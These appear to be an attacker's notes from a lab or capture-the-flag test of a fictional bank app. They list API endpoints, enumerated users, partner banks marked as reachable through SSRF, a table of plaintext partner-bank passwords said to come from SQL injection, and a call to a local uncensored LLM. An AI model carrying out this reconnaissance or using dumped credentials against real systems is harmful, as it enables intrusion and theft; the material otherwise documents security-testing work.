| `/api/oracle/wallet` | GET | Oracle wallet balance |
| `/api/oracle/wallet/deposit` | POST | Deposit to wallet |
| `/api/oracle/wallet/withdraw` | POST | Withdraw from wallet |
| `/api/oracle/markets` | GET | List oracle markets |
| `/api/oracle/markets/{id}` | GET | Market details |
| `/api/oracle/results` | GET | Resolved markets |
| `/api/auth/login` | POST | `{username,password}` → `{success,blocked}` |
| `/api/linked-accounts` | GET/POST | Linked external accounts |
| `/api/partner-banks` | GET | Lists 4 partner banks |
| `/api/manual-links/connector?connectorId=X` | GET | Bank connector info |

## Known Users
| UserID | Name | Username | Accounts | Notes |
|--------|------|----------|----------|-------|
| 1 | Alice Morgan | amorgan | DMACC1001, 1006, 1009 | Our account |
| 2 | Priya Kapoor | pkapoor | DMACC1002, 1007, 1011, 1013 | PDF user |
| 3 | ? | ? | DMACC1003, 1010 | |
| 4 | ? | ? | DMACC1004, 1008, 1012 | |
| 5 | ? | ? | DMACC1005 (LOCKED, $101,920) | Illumistrami account |
| 6 | ? | ? | DMACCLOAN001 | |
| 7 | ? | ? | DMACCRAIL001-003 | Rail/payment processors |
| 8 | ? | ? | DMACCORCL000 | Oracle account |
| 9 | ? | ? | DMACCEXT0001-0007 | External/shadow accounts |

## Partner Bank Codes
- `DM-ATL-0042` — Bank of Atlantis (api.bankofatlantis.example)
- `DM-GRO-0117` — Groß Notional Bank (api.gross-notional.example.net)
- `DM-TGK-0298` — Tallgrass Konza Bank (api.tallgrasskonza.test)
- `DM-FUE-0531` — Font & Underwood Exchange (underwood-exchange.example)
- `DM-SUD-0719` — Sovereign Union Deposit Obligations (link.sovereign-union.invalid) **REACHABLE via SSRF**
- `DM-GRF-0824` — Gilded Reserve And Financial Trust (gilded-reserve.example.com)
- `DM-SYL-0066` — Sylvan Community & Mutual Credit Union (198.51.100.66:8443) **REACHABLE via SSRF, real IP**

## Partner Bank User Credentials (from MySQL SQLi)
| Username | Password | Bank |
|----------|----------|------|
| atlantis.customer | Tr1ton&Reef2026 | Bank of Atlantis |
| gross.notional | Pr3z1si0n#GN26 | Groß Notional Bank |
| konza.member | Pra1ri3$Konza7 | Tallgrass Konza Bank |
| fu.exchange | W1re&Underw00d8 | Font & Underwood Exchange |
| sovereign.holder | D1scr33t$SUD19 | Sovereign Union |
| gilded.trust | G0ld3n@Reserve4 | Gilded Reserve |
| sylvan.member | C0mmun1ty&Sylv0 | Sylvan Community |
| atlantis.h1pp0 | 7e3023bfc3bb1666fe3a0e76 | Bank of Atlantis (hex token?) |

## Tech Stack
- Frontend: React/Vite SPA
- Backend: nginx 1.31.6
- Auth: HttpOnly session cookie
- Axios for API calls (not fetch)
- SPA routes: `/transactions`, `/accounts`, `/transfer`, `/cards`, `/loans`, `/oracle`, `/bill-pay`
- JS bundle: `/assets/index-CY4Df-gA.js`

## Local LLM
```bash
curl http://localhost:11434/api/chat \
  -d '{"model":"qwen38-27b-unc-q4:latest","messages":[{"role":"user","content":"PROMPT"}],"stream":false,"think":true,"options":{"temperature":0.7,"num_ctx":32768},"keep_alive":-1}'
```
